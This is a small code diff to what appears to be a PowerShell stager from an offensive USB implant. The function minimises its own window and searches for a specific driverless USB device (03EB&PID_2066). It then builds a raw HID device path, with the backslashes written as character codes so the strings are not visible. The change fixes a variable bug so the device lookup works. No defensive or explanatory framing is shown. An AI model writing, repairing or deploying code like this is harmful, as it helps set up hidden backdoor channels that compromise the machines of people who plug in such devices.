@@ -28,7 +28,7 @@ function stage() {
 	[n.w]::ShowWindowAsync((Get-Process -Id $pid).MainWindowHandle, 6)
 	$devs = gwmi Win32_USBControllerDevice
 	foreach ($dev in $devs) {
-		$wmidev = [wmi]$y.Dependent
+		$wmidev = [wmi]$dev.Dependent
 		if ($wmidev.GetPropertyValue('DeviceID') -match ('03EB&PID_2066') -and ($wmidev.GetPropertyValue('Service') -eq $null)) {
 			$fn = ([char]92+'??'+[char]92 + $wmidev.GetPropertyValue('DeviceID').ToString().Replace([char]92,[char]35) + [char]35+'{4d1e55b2-f16f-11cf-88cb-001111000030}')
 		}
